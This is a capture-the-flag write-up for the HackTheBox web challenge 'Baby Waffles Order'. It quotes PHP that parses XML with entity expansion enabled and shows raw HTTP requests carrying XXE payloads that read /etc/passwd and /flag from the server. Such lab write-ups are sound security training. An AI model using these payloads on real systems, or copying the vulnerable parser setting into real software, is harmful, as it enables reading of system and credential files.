# Solution for HackTheBox - Challenges - Web - Retired - Baby Waffles Order

From the code of the web application, we can see 
```text
else if ($_SERVER['HTTP_CONTENT_TYPE'] === 'application/xml')
        {
            $order = simplexml_load_string($body, 'SimpleXMLElement', LIBXML_NOENT);
            if (!$order->food) return 'You need to select a food option first';
            return "Your {$order->food} order has been submitted successfully.";
        }

```

Cool so it accepts XML data. 

Now we try to send XML Data in the form

First, let's change the application to read application/json then we can try XML

```text
POST /api/order HTTP/1.1
Host: 206.189.125.37:31584
Content-Length: 40
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.125.37:31584
Referer: http://206.189.125.37:31584/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Connection: close

{"table_num":"1234","food":"Ice Scream"}
```

Cool. Now we send it in XML

```text
POST /api/order HTTP/1.1
Host: 206.189.125.37:31584
Content-Length: 124
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.125.37:31584
Referer: http://206.189.125.37:31584/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/xml
Connection: close

<?xml version="1.0" encoding="ISO-8859-1"?><order>
    <table_num>
1234</table_num>
    <food>Ice Scream</food>
</order>
```

Now we send a POC to check if it is vulnerable to XXE
```text
POST /api/order HTTP/1.1
Host: 206.189.125.37:31584
Content-Length: 159
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.125.37:31584
Referer: http://206.189.125.37:31584/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/xml
Connection: close

<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<order>
    <table_num>1234</table_num>
    <food>
&xxe;</food>
</order>
```

It worked! After some digging around and some nudges, I was able to find the flag was in a directory called /flag.

```
POST /api/order HTTP/1.1
Host: 206.189.125.37:31584
Content-Length: 153
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://206.189.125.37:31584
Referer: http://206.189.125.37:31584/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/xml
Connection: close

<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]>
<order>
    <table_num>1234</table_num>
    <food>
&xxe;</food>
</order>
```

